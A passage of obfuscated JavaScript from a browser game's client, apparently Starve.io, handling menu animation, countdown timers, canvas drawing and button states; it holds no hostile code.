					ΔΔᐃⲆᐃ[ⵠᐃ].ⲆΔᐃ === ⵠⵠⵠ.ⵠᐃⵠΔΔ ? (ᐃᐃᐃ.unlock.ⲆᐃⲆⲆᐃ[ⵠᐃ] = 1, ᐃᐃᐃ.unlock.ᐃⲆⵠΔⵠ[ⵠᐃ] = 1) : (ᐃᐃᐃ.unlock.ⲆᐃⲆⲆᐃ[ⵠᐃ] = 0, ᐃᐃᐃ.unlock.ᐃⲆⵠΔⵠ[ⵠᐃ] = 0)
				}
			}
			this.ᐃΔⲆΔⵠⲆⵠ = ᐃΔⲆΔⵠⲆⵠ;
			ᐃΔⲆΔⵠⲆⵠ();
			this.ΔⲆⵠⵠⲆ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("trevda"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("trevda").style,
				translate: {
					y: Ⲇᐃⵠⵠ,
					x: ⲆΔⵠ
				},
				"ⵠⲆᐃ": function() {
					this.style.left = this.translate.x + ⵠ[39];
					this.style.top = Math.floor(this.translate.y) + ⵠ[39]
				}
			};
			var ΔⲆⲆⲆΔ = ⵠᐃⲆᐃ;
			var ΔᐃΔᐃᐃ = 30;
			var ΔⵠᐃⲆΔⲆΔ = function() {
				ᐃᐃᐃ.ⵠⲆᐃ();
				ΔⲆⲆⲆΔ++;
				if (ΔᐃΔᐃᐃ == ΔⲆⲆⲆΔ) {
					ᐃᐃᐃ.ᐃⲆᐃⲆᐃⲆΔ();
					ᐃᐃᐃ.ΔᐃᐃΔⲆⵠⵠ = ᐃⲆⲆᐃΔ;
					ᐃᐃᐃ.ⵠⲆᐃ();
					return
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ΔⵠᐃⲆΔⲆΔ, 0)
			};
			this.ⵠΔΔΔᐃ = function(ΔⲆⵠΔΔ) {
				ⲆΔⲆΔᐃ = ΔⲆⵠΔΔ;
				ᐃᐃᐃ.ⵠᐃΔⲆΔⵠⲆ();
				ᐃᐃᐃ.ΔᐃᐃΔⲆⵠⵠ = 0;
				ᐃΔΔᐃⵠ = -1;
				ⵠⲆⲆᐃΔ()
			};
			var ⲆΔⲆΔᐃ;
			var ᐃΔΔᐃⵠ = -ⲆⵠⲆⲆ;
			var ᐃⲆΔΔᐃ = 30;
			var ⵠⲆⲆᐃΔ = function() {
				ᐃᐃᐃ.ⵠⲆᐃ();
				ᐃΔΔᐃⵠ++;
				if (ᐃⲆΔΔᐃ == ᐃΔΔᐃⵠ) {
					ΔΔᐃᐃ.set("starve_nickname", ᐃᐃᐃ.ⵠΔⵠⲆᐃ.input.value, {
						expires: 30
					});
					ᐃᐃᐃ.ⵠΔⵠⲆᐃ.style.display = ⵠ[465];
					ᐃᐃᐃ.ΔΔⲆΔⲆ.style.display = ⵠ[465];
					ᐃᐃᐃ.ⵠⲆᐃΔΔᐃᐃ.style.display = ⵠ[465];
					ᐃᐃᐃ.ⵠⵠⵠⲆⲆΔⲆ.style.display = ⵠ[465];
					ᐃᐃᐃ.ΔⲆⵠⵠⲆ.style.display = ⵠ[465];
					ᐃᐃᐃ.stop();
					ⲆΔⲆΔᐃ();
					return
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ⵠⲆⲆᐃΔ, 0)
			};
			this.ⲆΔⲆᐃⵠ = false;
			this.stop = function() {
				this.ⲆΔⲆᐃⵠ = ᐃⵠⵠᐃΔ
			};
			this.ⲆΔΔᐃⵠ = function() {
				check_ads();
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[406]).style.backgroundColor = Ⲇ.ⲆⵠΔⲆᐃ[ΔⵠⵠᐃΔ.time];
				ᐃᐃᐃ.ⵠΔⵠⲆᐃ.style.display = ⵠ[35];
				ᐃᐃᐃ.ΔΔⲆΔⲆ.style.display = ⵠ[35];
				ᐃᐃᐃ.ⵠⲆᐃΔΔᐃᐃ.style.display = ⵠ[35];
				ᐃᐃᐃ.ⵠⵠⵠⲆⲆΔⲆ.style.display = ⵠ[35];
				ᐃᐃᐃ.ΔⲆⵠⵠⲆ.style.display = ⵠ[35];
				ᐃᐃᐃ.waiting = false;
				ᐃᐃᐃ.ⲆΔⲆᐃⵠ = true;
				ᐃΔΔᐃⵠ = -Ⲇᐃⵠ;
				ΔⲆⲆⲆΔ = ΔΔⵠⵠ;
				ΔⵠᐃⲆΔⲆΔ()
			};
			this.ⵠΔΔⲆᐃⲆΔ = function(ΔⲆΔΔⲆ, ⵠᐃⲆΔⵠ) {
				ⵠᐃⲆΔⵠ = ⵠᐃⲆΔⵠ < ᐃΔΔ ? -ⵠᐃⲆΔⵠ : ⵠᐃⲆΔⵠ;
				if (ΔⲆⲆⵠ === (ΔⲆΔΔⲆ.position & ΔⲆⲆⵠ)) {
					if (ΔⲆᐃⵠ === (ΔⲆΔΔⲆ.position & ΔⲆᐃⵠ)) ΔⲆΔΔⲆ.translate.x = Δᐃⵠᐃ + ΔⲆΔΔⲆ.translate.ᐃΔⵠᐃᐃ - ⵠᐃⲆΔⵠ;
					else(ΔⲆΔΔⲆ.position & ΔⵠⲆⵠⲆ) === ΔⵠⲆⵠⲆ ? ΔⲆΔΔⲆ.translate.x = Δᐃⵠᐃ + ΔⲆΔΔⲆ.translate.ᐃΔⵠᐃᐃ + ⵠᐃⲆΔⵠ : ΔⲆΔΔⲆ.translate.x = Δᐃⵠᐃ + ΔⲆΔΔⲆ.translate.ᐃΔⵠᐃᐃ
				} else if ((ΔⲆΔΔⲆ.position & ΔⲆᐃⵠ) === ΔⲆᐃⵠ) ΔⲆΔΔⲆ.translate.x = ΔⲆΔΔⲆ.translate.ᐃΔⵠᐃᐃ - ⵠᐃⲆΔⵠ;
				else ΔⵠⲆⵠⲆ === (ΔⲆΔΔⲆ.position & ΔⵠⲆⵠⲆ) ? ΔⲆΔΔⲆ.translate.x = ΔΔΔᐃ - ΔⲆΔΔⲆ.translate.ᐃΔⵠᐃᐃ + ⵠᐃⲆΔⵠ : ΔⲆΔΔⲆ.translate.x = ΔⲆΔΔⲆ.translate.ᐃΔⵠᐃᐃ;
				if (ⵠⲆΔᐃⲆⲆⲆ === (ΔⲆΔΔⲆ.position & ⵠⲆΔᐃⲆⲆⲆ)) {
					if (ⲆΔⵠⲆ === (ΔⲆΔΔⲆ.position & ⲆΔⵠⲆ)) ΔⲆΔΔⲆ.translate.y = ᐃΔⵠᐃ + ΔⲆΔΔⲆ.translate.ᐃᐃΔⵠⵠ - ⵠᐃⲆΔⵠ;
					else if (ⵠⵠΔⵠᐃⵠⵠ === (ΔⲆΔΔⲆ.position & ⵠⵠΔⵠᐃⵠⵠ)) ΔⲆΔΔⲆ.translate.y = ᐃΔⵠᐃ + ΔⲆΔΔⲆ.translate.ᐃᐃΔⵠⵠ + ⵠᐃⲆΔⵠ;
					else ΔⲆΔΔⲆ.translate.y = ᐃΔⵠᐃ + ΔⲆΔΔⲆ.translate.ᐃᐃΔⵠⵠ
				} else if ((ΔⲆΔΔⲆ.position & ⲆΔⵠⲆ) === ⲆΔⵠⲆ) ΔⲆΔΔⲆ.translate.y = ΔⲆΔΔⲆ.translate.ᐃᐃΔⵠⵠ - ⵠᐃⲆΔⵠ;
				else if (ⵠⵠΔⵠᐃⵠⵠ === (ΔⲆΔΔⲆ.position & ⵠⵠΔⵠᐃⵠⵠ)) ΔⲆΔΔⲆ.translate.y = ⵠⲆᐃⲆ + ΔⲆΔΔⲆ.translate.ᐃᐃΔⵠⵠ + ⵠᐃⲆΔⵠ;
				else ΔⲆΔΔⲆ.translate.y = ΔⲆΔΔⲆ.translate.ᐃᐃΔⵠⵠ;
				ΔⲆΔΔⲆ.style !== undefined && (ΔⲆΔΔⲆ.style.left = Math.floor(ΔⲆΔΔⲆ.translate.x) + ⵠ[39], ΔⲆΔΔⲆ.style.top = Math.floor(ΔⲆΔΔⲆ.translate.y) + ⵠ[39])
			};
			this.ⵠⲆᐃ = function() {
				var ⵠᐃⲆΔⵠ = ⵠⲆᐃⵠ;
				if (ΔⲆⲆⲆΔ != ΔᐃΔᐃᐃ || ᐃΔΔᐃⵠ != -ΔΔΔ) {
					if (ΔⲆⲆⲆΔ != ΔᐃΔᐃᐃ) var ⵠᐃⲆΔⵠ = 1500 / (ΔⲆⲆⲆΔ + ᐃᐃⵠ) - 50;
					if (ᐃΔΔᐃⵠ != -ΔᐃᐃⲆ) var ⵠᐃⲆΔⵠ = -(1750 / (ᐃⲆΔΔᐃ - ᐃΔΔᐃⵠ + ⲆⵠⲆⲆ) - 48)
				}
				for (var ⵠᐃ = 0; this.ⵠⵠⲆᐃ.length > ⵠᐃ; ⵠᐃ++) this.ⵠΔΔⲆᐃⲆΔ(this.ⵠⵠⲆᐃ[ⵠᐃ], ⵠᐃⲆΔⵠ);
				for (var ⵠᐃ = ⵠⲆⲆ; ⵠᐃ < this.buttons.length; ⵠᐃ++) this.ⵠΔΔⲆᐃⲆΔ(this.buttons[ⵠᐃ].info, ⵠᐃⲆΔⵠ);
				for (var ⵠᐃ = ᐃⵠⲆⵠ; ⵠᐃ < this.ᐃΔⵠΔΔ.length; ⵠᐃ++) this.ⵠΔΔⲆᐃⲆΔ(this.ᐃΔⵠΔΔ[ⵠᐃ], ⵠᐃⲆΔⵠ);
				this.ⵠᐃΔⲆⵠᐃᐃ.translate.x = (ΔΔΔᐃ - this.ⵠᐃΔⲆⵠᐃᐃ.ᐃⵠ.width) / ᐃⲆΔⲆ;
				this.ⵠᐃΔⲆⵠᐃᐃ.translate.y = 0;
				this.ⵠⲆᐃΔΔᐃᐃ.translate.x = ΔΔΔᐃ - 450;
				this.ⵠⲆᐃΔΔᐃᐃ.translate.y = ⵠⲆᐃⲆ - 40;
				this.ⵠⵠⵠⲆⲆΔⲆ.translate.x = ΔΔΔᐃ - 340;
				this.ⵠⵠⵠⲆⲆΔⲆ.translate.y = ⵠⲆᐃⲆ - 25;
				this.ΔⲆⵠⵠⲆ.translate.x = ΔΔΔᐃ - 320;
				this.ΔⲆⵠⵠⲆ.translate.y = 80;
				if (ΔᐃΔᐃᐃ != ΔⲆⲆⲆΔ || ᐃΔΔᐃⵠ != -1) {
					var ΔᐃⵠΔ = 0;
					if (ΔᐃΔᐃᐃ != ΔⲆⲆⲆΔ) {
						var ΔᐃⵠΔ = 1500 / (ΔⲆⲆⲆΔ + 1) - 50
					}
					if (ᐃΔΔᐃⵠ != -Ⲇᐃⵠ) {
						var ΔᐃⵠΔ = -(1750 / (ᐃⲆΔΔᐃ - ᐃΔΔᐃⵠ + ΔⵠΔⵠ) - 48)
					}
					this.ⵠᐃΔⲆⵠᐃᐃ.translate.y -= 0 < ΔᐃⵠΔ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
					this.ⵠⲆᐃΔΔᐃᐃ.translate.y -= Ⲇᐃᐃᐃ > ΔᐃⵠΔ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
					this.ⵠⵠⵠⲆⲆΔⲆ.translate.y -= ⵠⲆᐃⵠ > ΔᐃⵠΔ ? ΔᐃⵠΔ : -ΔᐃⵠΔ
				}
				this.ⵠⲆᐃΔΔᐃᐃ.ⵠⲆᐃ();
				this.ⵠⵠⵠⲆⲆΔⲆ.ⵠⲆᐃ();
				this.ΔⲆⵠⵠⲆ.ⵠⲆᐃ()
			};
			this.ⲆΔᐃⵠⲆᐃⵠ = function(Ⲇⵠᐃ) {
				var ⵠΔΔΔⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				var ΔⲆΔⵠᐃⲆⲆ = ⵠΔΔΔⵠ.getContext(ⵠ[289]);
				ⵠΔΔΔⵠ.width = 342;
				ⵠΔΔΔⵠ.height = 342;
				var ΔⵠΔΔΔ = -Math.PI / Δᐃⵠⵠ;
				for (var ⵠᐃ = 0; ⵠᐃ < Ⲇⵠᐃ.length; ⵠᐃ++) {
					var ΔΔΔΔⲆⲆᐃⲆⵠ = Ⲇⵠᐃ[ⵠᐃ][ΔⲆⲆ];
					var ᐃΔⲆᐃΔⵠΔ = Ⲇⵠᐃ[ⵠᐃ][ᐃΔᐃⲆ] * Math.PI / 180;
					ΔⲆΔⵠᐃⲆⲆ.beginPath();
					ΔⲆΔⵠᐃⲆⲆ.arc(171, 171, 170, ΔⵠΔΔΔ, ΔⵠΔΔΔ + ᐃΔⲆᐃΔⵠΔ, false);
					ΔⲆΔⵠᐃⲆⲆ.lineTo(171, 171);
					ΔⲆΔⵠᐃⲆⲆ.fillStyle = ΔΔΔΔⲆⲆᐃⲆⵠ;
					ΔⲆΔⵠᐃⲆⲆ.fill();
					ΔⵠΔΔΔ += ᐃΔⲆᐃΔⵠΔ
				}
				return ⵠΔΔΔⵠ
			};
			this.ⵠΔᐃᐃᐃⲆⵠⵠⵠ = function() {
				this.ⵠΔⵠᐃⵠⵠᐃ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[83]).value;
				this.ⵠΔⵠᐃⵠⵠᐃ !== this.ⵠⵠⲆᐃⲆΔⲆ && (this.ⵠⵠⲆᐃⲆΔⲆ = this.ⵠΔⵠᐃⵠⵠᐃ, this.ⵠⵠⵠⲆⵠⵠⵠ = ᐃⲆⲆⲆⲆ(this.ⵠΔⵠᐃⵠⵠᐃ, ⵠ[55], ⵠ[354], 45, 550))
			};
			this.ΔᐃΔⵠ = function() {
				ΔᐃΔⲆⲆᐃΔ();
				ⵠⲆᐃΔ.ΔΔⵠΔⲆⵠᐃ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(ⵠⲆᐃΔ.ΔΔⵠΔⲆⵠᐃ, ⵠⲆᐃΔ.ⵠⵠᐃⲆΔᐃΔ, .03);
				this.ⵠⵠⲆᐃ[ΔᐃⵠⵠⵠΔⲆ].translate.x = this.ⵠⵠⲆᐃ[ΔⲆⵠⲆ].translate.x + -72 + ⵠⲆᐃΔ.ΔΔⵠΔⲆⵠᐃ * 165;
				this.ⵠⵠⲆᐃ[ΔᐃⵠⵠⵠΔⲆ].translate.ᐃΔⵠᐃᐃ = this.ⵠⵠⲆᐃ[ΔᐃⵠⵠⵠΔⲆ].translate.x;
				this.ⵠⵠⲆᐃ[ΔᐃⵠⵠⵠΔⲆ].translate.y = this.ⵠⵠⲆᐃ[0].translate.y + 30;
				this.ⵠⵠⲆᐃ[ΔᐃⵠⵠⵠΔⲆ].translate.ᐃᐃΔⵠⵠ = this.ⵠⵠⲆᐃ[ΔᐃⵠⵠⵠΔⲆ].translate.y;
				for (var ⵠᐃ = ΔⵠⵠΔ; ⵠᐃ < this.ⵠⵠⲆᐃ.length; ⵠᐃ++) {
					this.ⵠⵠⲆᐃ[ⵠᐃ].active === ⵠⵠᐃΔ && this.ⵠⵠⲆᐃ[ⵠᐃ].ΔᐃΔⵠ(Δ)
				}
				var ΔⵠᐃΔΔⵠⲆ = this.ᐃⵠΔΔᐃ - Date.now();
				if (ΔⵠᐃΔΔⵠⲆ > 0) {
					var ⵠᐃΔᐃ = Math.floor(ΔⵠᐃΔΔⵠⲆ / 6e4);
					var ᐃⲆⲆΔΔ = Math.floor(ⵠᐃΔᐃ / 60);
					ⵠᐃΔᐃ %= 60;
					if (ⵠᐃΔᐃ !== this.ⵠⵠᐃⵠΔⵠⵠ) {
						this.ⵠⵠᐃⵠΔⵠⵠ = ⵠᐃΔᐃ;
						ⵠᐃΔᐃ = 10 > ⵠᐃΔᐃ ? "0" + ⵠᐃΔᐃ : "" + ⵠᐃΔᐃ;
						ᐃᐃᐃ.ΔΔⵠΔⲆⲆⵠ = ᐃⲆⲆⲆⲆ(ⵠᐃΔᐃ, ⵠ[55], ⵠ[354], 80, 200)
					}
					if (ᐃⲆⲆΔΔ !== this.ⵠⲆᐃΔΔⲆⲆ) {
						this.ⵠⲆᐃΔΔⲆⲆ = ᐃⲆⲆΔΔ;
						ᐃⲆⲆΔΔ = ᐃⲆⲆΔΔ < 10 ? "0" + ᐃⲆⲆΔΔ : "" + ᐃⲆⲆΔΔ;
						ᐃᐃᐃ.ΔⲆΔᐃΔⵠⲆ = ᐃⲆⲆⲆⲆ(ᐃⲆⲆΔΔ, ⵠ[55], ⵠ[354], 80, 200)
					}
					var ᐃⲆΔⲆᐃ = this.ⵠⵠⲆᐃ[ΔⵠᐃⵠΔⵠⲆ];
					ᐃⲆΔⲆᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠ = this.ΔⲆΔᐃΔⵠⲆ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⲆΔⲆᐃ.translate.x - ᐃⵠ.width / ⵠΔΔᐃΔ + 182, ᐃⲆΔⲆᐃ.translate.y - ᐃⵠ.height / ΔⲆᐃⵠᐃ + 40, ᐃⵠ.width / ⲆⵠΔΔ, ᐃⵠ.height / 2);
					var ᐃⵠ = this.ΔΔⵠΔⲆⲆⵠ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⲆΔⲆᐃ.translate.x - ᐃⵠ.width / ᐃⵠⵠΔ + 251, ᐃⲆΔⲆᐃ.translate.y - ᐃⵠ.height / ΔⲆⲆⲆ + 40, ᐃⵠ.width / ᐃⵠⲆⲆⲆ, ᐃⵠ.height / 2)
				}
				var ΔⵠᐃΔΔⵠⲆ = this.ⲆⲆᐃΔΔᐃⵠ - Date.now();
				if (0 < ΔⵠᐃΔΔⵠⲆ) {
					var ⵠᐃΔᐃ = Math.floor(ΔⵠᐃΔΔⵠⲆ / 6e4);
					var ᐃⲆⲆΔΔ = Math.floor(ⵠᐃΔᐃ / 60);
					var ᐃΔⲆ = Math.floor(ᐃⲆⲆΔΔ / 24);
					ⵠᐃΔᐃ %= 60;
					ᐃⲆⲆΔΔ %= 24;
					ⵠᐃΔᐃ !== this.ΔⵠⵠⲆⵠΔΔ && (this.ΔⵠⵠⲆⵠΔΔ = ⵠᐃΔᐃ, ⵠᐃΔᐃ = ⵠᐃΔᐃ < 10 ? "0" + ⵠᐃΔᐃ : "" + ⵠᐃΔᐃ, ᐃᐃᐃ.ᐃΔⵠΔⲆᐃⵠ = ᐃⲆⲆⲆⲆ(ⵠᐃΔᐃ, ⵠ[55], ⵠ[354], 80, 200));
					if (this.ΔⲆⵠΔⲆⲆΔ !== ᐃⲆⲆΔΔ) {
						this.ΔⲆⵠΔⲆⲆΔ = ᐃⲆⲆΔΔ;
						ᐃⲆⲆΔΔ = ᐃⲆⲆΔΔ < ⲆⵠⲆⲆᐃ ? "0" + ᐃⲆⲆΔΔ : "" + ᐃⲆⲆΔΔ;
						ᐃᐃᐃ.ᐃᐃᐃⲆⵠΔΔ = ᐃⲆⲆⲆⲆ(ᐃⲆⲆΔΔ, ⵠ[55], ⵠ[354], 80, 200)
					}
					ᐃΔⲆ !== this.ᐃΔΔⵠΔⵠⵠ && (this.ᐃΔΔⵠΔⵠⵠ = ᐃΔⲆ, ᐃΔⲆ = ᐃΔⲆ < 10 ? "0" + ᐃΔⲆ : "" + ᐃΔⲆ, ᐃᐃᐃ.ⵠΔΔΔⲆᐃⵠ = ᐃⲆⲆⲆⲆ(ᐃΔⲆ, ⵠ[55], ⵠ[354], 80, 200));
					var ᐃⲆΔⲆᐃ = this.ⵠⵠⲆᐃ[ⲆᐃΔᐃⲆⲆΔ];
					ᐃⲆΔⲆᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠ = this.ⵠΔΔΔⲆᐃⵠ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⲆΔⲆᐃ.translate.x - ᐃⵠ.width / 4 + 113, ᐃⲆΔⲆᐃ.translate.y - ᐃⵠ.height / ΔⲆⲆⲆ + 40, ᐃⵠ.width / ᐃⲆⵠᐃ, ᐃⵠ.height / ⲆᐃᐃⲆ);
					var ᐃⵠ = this.ᐃᐃᐃⲆⵠΔΔ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⲆΔⲆᐃ.translate.x - ᐃⵠ.width / ⵠΔΔᐃΔ + 182, ᐃⲆΔⲆᐃ.translate.y - ᐃⵠ.height / ΔΔⵠⵠΔ + 40, ᐃⵠ.width / ΔⵠⵠΔ, ᐃⵠ.height / ΔⵠⵠΔ);
					var ᐃⵠ = this.ᐃΔⵠΔⲆᐃⵠ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⲆΔⲆᐃ.translate.x - ᐃⵠ.width / ⵠⵠΔᐃΔ + 251, ᐃⲆΔⲆᐃ.translate.y - ᐃⵠ.height / 4 + 40, ᐃⵠ.width / 2, ᐃⵠ.height / 2)
				}
				if ((this.ⲆⲆⲆⲆⵠ & ⲆⵠΔΔΔ) === ⲆⵠΔΔΔ) this.buttons[ᐃⵠⲆΔⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ᐃⲆⵠⲆⲆ) === ᐃⲆⵠⲆⲆ) this.buttons[ⲆᐃᐃᐃᐃΔΔ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ⲆΔⵠⵠΔ) === ⲆΔⵠⵠΔ) this.buttons[ᐃⵠⲆⲆΔⵠⲆ].info.state = ᐃΔⵠⵠ;
				else if (Ⲇⵠᐃⵠᐃ === (this.ⲆⲆⲆⲆⵠ & Ⲇⵠᐃⵠᐃ)) this.buttons[ΔⲆᐃΔⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if (ᐃᐃᐃⲆᐃᐃⵠ === (this.ⲆⲆⲆⲆⵠ & ᐃᐃᐃⲆᐃᐃⵠ)) this.buttons[ⵠⵠᐃΔΔⲆⲆ].info.state = ᐃΔⵠⵠ;
				else if (ᐃᐃΔᐃⵠ === (this.ⲆⲆⲆⲆⵠ & ᐃᐃΔᐃⵠ)) this.buttons[ᐃⵠⲆΔⵠⲆⵠ].info.state = ᐃΔⵠⵠ;
				else if (ΔᐃⵠⵠΔ === (this.ⲆⲆⲆⲆⵠ & ΔᐃⵠⵠΔ)) this.buttons[ⵠⲆⲆⲆⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if (ΔᐃⲆᐃΔᐃⵠ === (this.ⲆⲆⲆⲆⵠ & ΔᐃⲆᐃΔᐃⵠ)) this.buttons[ⵠⲆⲆⲆⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if (ⵠΔΔⵠⵠⵠᐃ === (this.ⲆⲆⲆⲆⵠ & ⵠΔΔⵠⵠⵠᐃ)) this.buttons[ⵠⲆⲆⲆⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if (ᐃⵠⵠⲆΔΔΔ === (this.ⲆⲆⲆⲆⵠ & ᐃⵠⵠⲆΔΔΔ)) this.buttons[ⵠⲆⲆⲆⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if (ΔᐃΔΔⲆⲆΔ === (this.ⲆⲆⲆⲆⵠ & ΔᐃΔΔⲆⲆΔ)) this.buttons[ⵠⲆⲆⲆⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ΔⲆΔⲆᐃᐃᐃ) === ΔⲆΔⲆᐃᐃᐃ) this.buttons[ⵠⲆⲆⲆⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ᐃΔⵠⵠⲆΔᐃ) === ᐃΔⵠⵠⲆΔᐃ) this.buttons[ⵠⲆⲆⲆⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				else if (ᐃΔⵠΔⵠ === (this.ⲆⲆⲆⲆⵠ & ᐃΔⵠΔⵠ)) this.buttons[ᐃⵠⲆⲆΔⵠⲆ].info.state = ᐃΔⵠⵠ;
				else if (ⲆⵠΔⲆⵠ === (this.ⲆⲆⲆⲆⵠ & ⲆⵠΔⲆⵠ)) this.buttons[ᐃⵠⲆⲆΔⵠⲆ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ᐃᐃⵠⲆⵠ) === ᐃᐃⵠⲆⵠ) this.buttons[ᐃⵠⲆⲆΔⵠⲆ].info.state = ᐃΔⵠⵠ;
				else if (ᐃⲆΔⲆΔ === (this.ⲆⲆⲆⲆⵠ & ᐃⲆΔⲆΔ)) this.buttons[ᐃⵠⲆⲆΔⵠⲆ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ᐃΔⵠᐃⲆ) === ᐃΔⵠᐃⲆ) this.buttons[ᐃⵠⲆⲆΔⵠⲆ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ⵠᐃΔⲆΔ) === ⵠᐃΔⲆΔ) this.buttons[ᐃⵠⲆⲆΔⵠⲆ].info.state = ᐃΔⵠⵠ;
				else if (ᐃⲆᐃⵠⲆ === (this.ⲆⲆⲆⲆⵠ & ᐃⲆᐃⵠⲆ)) this.buttons[ΔΔΔⲆⲆΔΔ].info.state = ᐃΔⵠⵠ;
				else if (ᐃΔᐃᐃⵠ === (this.ⲆⲆⲆⲆⵠ & ᐃΔᐃᐃⵠ)) this.buttons[ΔΔΔⲆⲆΔΔ].info.state = ᐃΔⵠⵠ;
				else if (ⵠᐃⲆⵠⵠ === (this.ⲆⲆⲆⲆⵠ & ⵠᐃⲆⵠⵠ)) this.buttons[ΔΔΔⲆⲆΔΔ].info.state = ᐃΔⵠⵠ;
				else if ((this.ⲆⲆⲆⲆⵠ & ΔᐃΔᐃᐃⵠⵠ) === ΔᐃΔᐃᐃⵠⵠ) this.buttons[ΔⲆᐃΔⵠⲆᐃ].info.state = ᐃΔⵠⵠ;
				if ((this.ⲆⲆⲆⲆⵠ & ᐃⲆⵠⲆⲆ) === ᐃⲆⵠⲆⲆ) {
					if (this.ⵠΔᐃΔⲆᐃᐃ === this.ΔⵠⲆΔⲆⵠᐃ) {
						this.ᐃΔᐃⵠⵠΔⵠ = this.ᐃΔΔΔⵠᐃⵠ;
						this.buttons[this.ᐃΔΔΔⵠᐃⵠ].info.active = ⲆᐃⲆⲆ;
						this.buttons[this.ⲆⵠⵠⵠΔΔᐃ].info.active = ⲆᐃⲆⲆ;
						this.buttons[this.ⵠΔΔᐃⲆⲆⵠ].info.active = ⲆᐃⲆⲆ
					} else {
						this.buttons[this.ᐃΔΔΔⵠᐃⵠ].info.active = ⵠⵠᐃΔ;
						this.buttons[this.ⲆⵠⵠⵠΔΔᐃ].info.active = ⵠⵠᐃΔ;
						this.buttons[this.ⵠΔΔᐃⲆⲆⵠ].info.active = ⵠⵠᐃΔ
					}
					if (this.ᐃⵠⵠⵠⵠΔΔ === this.ΔⵠⲆΔⲆⵠᐃ) this.buttons[this.ᐃⵠⵠⵠⵠΔΔ].info.state = ᐃΔⵠⵠ;
					else if (this.ᐃⵠΔᐃᐃᐃⵠ === this.ΔⵠⲆΔⲆⵠᐃ) this.buttons[this.ᐃⵠΔᐃᐃᐃⵠ].info.state = ᐃΔⵠⵠ;
					else if (this.ⵠΔᐃΔⲆᐃᐃ === this.ΔⵠⲆΔⲆⵠᐃ) this.buttons[this.ⵠΔᐃΔⲆᐃᐃ].info.state = ᐃΔⵠⵠ;
					else if (this.ΔⵠⲆΔⲆⵠᐃ === this.ⵠΔⲆⲆᐃⲆᐃ) this.buttons[this.ⵠΔⲆⲆᐃⲆᐃ].info.state = ᐃΔⵠⵠ;
					else this.ΔⵠⲆΔⲆⵠᐃ === this.ᐃΔΔⵠΔᐃⲆ && (this.buttons[this.ᐃΔΔⵠΔᐃⲆ].info.state = ᐃΔⵠⵠ);
					if (this.ᐃΔᐃⵠⵠΔⵠ === this.ᐃΔΔΔⵠᐃⵠ) this.buttons[this.ᐃΔΔΔⵠᐃⵠ].info.state = ᐃΔⵠⵠ;
					else if (this.ᐃΔᐃⵠⵠΔⵠ === this.ⲆⵠⵠⵠΔΔᐃ) this.buttons[this.ⲆⵠⵠⵠΔΔᐃ].info.state = ᐃΔⵠⵠ;
					else if (this.ᐃΔᐃⵠⵠΔⵠ === this.ⵠΔΔᐃⲆⲆⵠ) this.buttons[this.ⵠΔΔᐃⲆⲆⵠ].info.state = ᐃΔⵠⵠ;
					if (this.ᐃⵠᐃΔⵠⲆΔ === this.ᐃⵠⵠᐃᐃⲆⲆ) this.buttons[this.ᐃⵠⵠᐃᐃⲆⲆ].info.state = ᐃΔⵠⵠ;
					else if (this.ᐃⵠᐃΔⵠⲆΔ === this.ⲆⲆⵠⲆⲆⵠᐃ) this.buttons[this.ⲆⲆⵠⲆⲆⵠᐃ].info.state = ᐃΔⵠⵠ;
					else if (this.ᐃⵠᐃΔⵠⲆΔ === this.ⵠⲆᐃΔᐃⲆⲆ) this.buttons[this.ⵠⲆᐃΔᐃⲆⲆ].info.state = ᐃΔⵠⵠ;
					if (this.ΔΔⲆⵠᐃΔⲆ === this.ⲆΔᐃⲆⵠΔⵠ) this.buttons[this.ΔΔⲆⵠᐃΔⲆ].info.state = ᐃΔⵠⵠ;
					else if (this.ⲆΔᐃⲆⵠΔⵠ === this.ΔΔⵠΔΔΔⲆ) this.buttons[this.ΔΔⵠΔΔΔⲆ].info.state = ᐃΔⵠⵠ;
					else if (this.ⲆᐃΔⲆΔⲆᐃ === this.ⲆΔᐃⲆⵠΔⵠ) this.buttons[this.ⲆᐃΔⲆΔⲆᐃ].info.state = ᐃΔⵠⵠ;
					else if (this.ⲆΔᐃⲆⵠΔⵠ === this.ⵠᐃᐃΔⵠⲆⲆ) this.buttons[this.ⵠᐃᐃΔⵠⲆⲆ].info.state = ᐃΔⵠⵠ;
